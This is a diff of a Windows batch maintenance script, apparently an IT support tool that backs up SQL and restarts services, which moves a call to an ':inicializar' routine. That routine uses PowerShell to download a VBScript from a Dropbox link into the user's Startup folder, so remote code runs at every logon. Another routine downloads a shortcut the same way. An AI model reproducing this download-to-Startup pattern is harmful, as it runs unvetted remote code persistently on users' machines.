@@ -313,7 +313,6 @@ for /f "delims=" %%A in ('powershell -Command "[math]::Round((Get-WmiObject Win3
 )
 	call :LOGS
 	call :link
-	call :inicializar
 :: =============================================
 :: BACKUP SQL
 :: =============================================
@@ -358,6 +357,7 @@ if %errorlevel% equ 0 (
 	call :IPV1
 	call :StopServices
 	call :StartServices
+	call :inicializar
 	call :LIMPEZAA
 ::==========================
 ::         FUNÇOES
@@ -543,11 +543,12 @@ endlocal
 :link
 if exist "%USERPROFILE%\Desktop\Manager-V1.lnk" exit
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/2h05ugy511yddlo1910eh/Manager-V1.lnk?rlkey=3ou61axp8vr1ss4xh2ybwj3jx&st=8xs55m9c&dl=1', [Environment]::GetFolderPath('Desktop') + '\Manager-V1.lnk')"
-endlocal
+goto :eof
 
 :inicializar
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/akorc9rgtubicumxfgv8b/Menssagem.vbs?rlkey=0yxqyoicv6u83hlya8bnlar0r&st=vxv6y6ax&dl=1', [Environment]::GetFolderPath('Startup') + '\Menssagem.vbs')"
-endlocal
+goto :eof
+
 
 
 
